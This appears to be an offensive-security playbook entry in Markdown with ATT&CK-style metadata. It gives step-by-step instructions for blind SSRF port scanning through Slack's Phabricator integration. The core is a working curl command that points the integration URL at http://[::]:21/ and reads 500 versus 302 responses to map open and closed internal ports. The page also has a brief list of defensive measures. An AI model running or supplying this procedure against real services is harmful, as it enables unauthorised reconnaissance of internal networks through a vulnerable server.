---
tags:
  - ssrf
  - ipv6
  - phabricator
  - blind-ssrf
  - port-scan
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/configure-phabricator-ssrf-integration-closed-port]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
updated_at: '2025-12-14T04:08:48.361Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 7b35b988-6a15-4a9f-857c-008d976b8ef0
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Active Scanning]]'
---
# Test-Phabricator-with-Closed-Port-for-Blind-SSRF

## Summary

This procedure tests blind SSRF in Phabricator integration by configuring a closed port (e.g., 21), observing a 500 error to differentiate from open ports and confirm the vector's utility for scanning.

## Description

Repeating the Phabricator config update with a non-responsive port demonstrates failure modes. The backend's connection timeout or refusal results in a server error, allowing attackers to map open/closed ports blindly without direct output from the service.

## Requirements

1. Same as Phabricator open port config
2. Knowledge of likely closed ports (e.g., 21 for FTP)

## Defense

Defensive measures and detection strategies:

- Monitor for repeated 500 errors on integration saves
- Implement connection timeouts and error logging for internal fetches
- Blockloopback resolutions in backend resolvers

## Objectives

1. Configure URL to closed port 21
2. Observe failure response for blind detection
3. Validate SSRF for port differentiation

## Instructions

### Step 1: Update to Closed Port

**Context**: Change the port in the URL to a closed one and submit.

**Command** ([[commands/configure-phabricator-ssrf-integration-closed-port]]):
```bash
curl -X POST https://agarri.slack.com/services/4836378801 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "edit_service=1&edit_label=1&phabricator_url=http://[::]:21/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1"
```

> Response: 500 Server Error due to connection failure. This confirms the blind SSRF behavior.

### Step 2: Compare Responses

**Context**: Note the difference from open port (302 vs. 500).

**Command** (No command; manual comparison).

> Use logs or repeated tests to build port map.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Active Scanning]]

### Sub-Techniques

- None

## Commands Used

- [[commands/configure-phabricator-ssrf-integration-closed-port]]

## Tools Used

- None

## Tags

- [[ssrf]]
- [[blind-ssrf]]
- [[port-scan]]
